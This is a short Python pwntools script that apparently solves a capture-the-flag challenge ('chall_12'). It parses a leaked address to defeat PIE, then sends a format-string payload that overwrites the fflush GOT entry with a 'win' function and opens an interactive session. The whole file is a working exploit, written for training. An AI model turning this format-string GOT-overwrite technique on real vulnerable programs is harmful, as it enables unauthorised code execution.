from pwn import *

def main():
	binary = context.binary = ELF("./chall_12")
	p = process("./chall_12")
	addr = p.recv().decode().split("0x")[1].split("\n")[0]
	p.sendline()
	binary.address = int(addr,16) - binary.sym.main
	payload = fmtstr_payload(6, {binary.got.fflush:binary.sym.win})
	p.sendline(payload)
	p.interactive()
main()
